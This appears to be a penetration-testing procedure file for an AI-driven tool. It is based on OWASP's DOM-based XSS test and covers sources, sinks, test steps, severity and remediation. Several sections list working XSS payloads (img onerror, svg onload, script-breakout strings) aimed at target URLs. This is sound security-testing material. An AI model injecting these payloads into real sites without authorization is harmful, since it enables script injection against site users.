---
id: WSTG-CLNT-01
title: Testing for DOM-Based Cross-Site Scripting
category: Client-Side
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting
---

# WSTG-CLNT-01: Testing for DOM-Based Cross-Site Scripting

## Summary

DOM-based XSS occurs when client-side JavaScript reads data from a controllable source (e.g., URL fragment, `document.referrer`) and writes it to a dangerous sink (e.g., `innerHTML`, `eval()`, `document.write()`) without proper sanitization. Unlike reflected/stored XSS, the payload never reaches the server.

## Test Objectives

- Identify JavaScript code that uses dangerous sources and sinks
- Determine if user-controllable data flows from sources to sinks without sanitization
- Test if XSS payloads execute through DOM manipulation

## Prerequisites

- Target application uses client-side JavaScript
- Docker pentest container capturing traffic
- JavaScript source code is accessible (not fully obfuscated)

## Test Steps

### Step 1: Identify DOM Sources and Sinks

**CLI Actions:**
1. Use `curl` to fetch pages that contain JavaScript
2. Analyze the JavaScript for dangerous patterns

**Dangerous Sources (user-controllable input):**
```javascript
document.URL
document.documentURI
document.location (href, search, hash, pathname)
document.referrer
window.name
location.hash
location.search
location.href
document.cookie
Web Storage (localStorage, sessionStorage)
```

**Dangerous Sinks (execution points):**
```javascript
innerHTML
outerHTML
document.write()
document.writeln()
eval()
setTimeout(string)
setInterval(string)
Function(string)
element.setAttribute("onclick", ...)
element.src = ...
location.href = ...
location.assign()
location.replace()
$.html()         (jQuery)
$(selector)      (jQuery - when selector comes from user input)
```

### Step 2: Test URL Fragment-Based DOM XSS

**CLI Actions:**
1. Use `curl` to fetch the target page
2. Analyze the JavaScript for `location.hash` or `location.search` usage
3. Construct URLs with XSS payloads in the fragment/query:

```
https://target.com/page#<img src=x onerror=alert('XSS')>
https://target.com/page#javascript:alert('XSS')
https://target.com/page?param=<script>alert('XSS')</script>
https://target.com/page#"><img src=x onerror=alert('XSS')>
```

Note: Fragment-based payloads (`#`) won't appear in HTTP proxy history since fragments aren't sent to the server. Document this for manual browser testing.

### Step 3: Test JavaScript Variable Injection

**CLI Actions:**
If JavaScript includes user input in variables:

```javascript
var userInput = "USER_CONTROLLED_VALUE";
```

Use `curl` to inject:
```
";alert('XSS');//
</script><script>alert('XSS')</script>
```

### Step 4: Test jQuery Sink Patterns

**CLI Actions:**
1. Check if the application uses jQuery
2. Look for patterns like `$(location.hash)` or `$('#' + userInput)`
3. These can be exploited if user input reaches jQuery selectors

```
https://target.com/page#<img/src=x onerror=alert('XSS')>
```

### Step 5: Test postMessage Handlers

**CLI Actions:**
1. Use `curl` to fetch pages and search for `addEventListener('message'` or `onmessage`
2. If `postMessage` handlers process data without origin validation, DOM XSS may be possible via cross-origin messages

### Step 6: Review JavaScript for Data Flow

**CLI Actions:**
1. Use `curl` to collect all JavaScript files loaded by the application
2. Search for source-to-sink data flows
3. Focus on: URL parameter reading -> DOM manipulation patterns

## Payloads

### URL Fragment Payloads
```
#<img src=x onerror=alert('XSS')>
#<svg onload=alert('XSS')>
#"><img src=x onerror=alert('XSS')>
#javascript:alert('XSS')
```

### URL Parameter Payloads
```
?param=<img src=x onerror=alert('XSS')>
?param="><script>alert('XSS')</script>
?param='-alert('XSS')-'
?param=\'-alert(\'XSS\')//
```

### jQuery-Specific Payloads
```
#<img src=x onerror=alert('XSS')>
?selector=<img/src=x onerror=alert('XSS')>
```

### eval/setTimeout/setInterval Payloads
```
?input=alert('XSS')
?callback=alert('XSS')
?func=alert('XSS')
```

### innerHTML Payloads
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

## Detection Criteria

A finding should be logged when:
- User-controllable data (from URL, referrer, postMessage) reaches a dangerous sink without sanitization
- XSS payloads execute in the browser via DOM manipulation
- JavaScript code uses `eval()`, `document.write()`, or `innerHTML` with user-controllable data
- jQuery selectors are constructed from user input
- `postMessage` handlers lack origin validation

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| DOM XSS via URL parameter or fragment, easily triggerable | High |
| DOM XSS in authenticated context, can steal sessions | High |
| DOM XSS via postMessage (requires victim to visit attacker page) | Medium |
| DOM XSS blocked by CSP | Low |
| Dangerous source-to-sink flow exists but is not currently exploitable | Low |
| `eval()` used but with server-controlled data only | Informational |

## Remediation

- Avoid using dangerous sinks (`innerHTML`, `document.write()`, `eval()`)
- Use `textContent` or `innerText` instead of `innerHTML` for text content
- Use `createElement` + `appendChild` for DOM manipulation
- Sanitize all data from DOM sources before use (use DOMPurify)
- Validate `postMessage` origin before processing
- Implement Content-Security-Policy to mitigate impact
- Use trusted types if browser support is sufficient

## References

- [OWASP Testing Guide - DOM-Based XSS](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [technique - DOM-Based XSS](https://owasp.org/web-security/cross-site-scripting/dom-based)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

